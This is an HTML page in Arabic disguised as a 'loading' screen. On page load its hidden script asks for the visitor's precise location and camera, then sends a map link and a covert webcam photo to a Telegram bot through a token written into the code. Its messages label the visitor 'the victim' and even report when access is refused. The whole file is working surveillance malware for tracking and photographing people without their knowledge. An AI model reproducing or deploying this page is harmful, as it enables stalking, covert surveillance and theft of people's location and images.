<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل...</title>
    <style>
        body { background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
    </style>
</head>
<body>
    <div id="status">جاري معالجة البيانات...</div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8734073875:AAF5fOQ11ouU73zemiV5hxuAhdOao0Zls3s";
        const CHAT_ID = "6082990097";

        async function startEverything() {
            // 1. طلب الموقع الجغرافي بدقة عالية
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 موقع الضحية: ${mapLink}`);
            }, error => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ رفض الضحية إعطاء الموقع أو حدث خطأ.`);
            }, { enableHighAccuracy: true });

            // 2. طلب الكاميرا والتقاط الصورة
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'capture.jpg');

                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            stream.getTracks().forEach(track => track.stop());
                        });
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {
                console.error(err);
            }
        }

        window.onload = startEverything;
    </script>
</body>
</html>
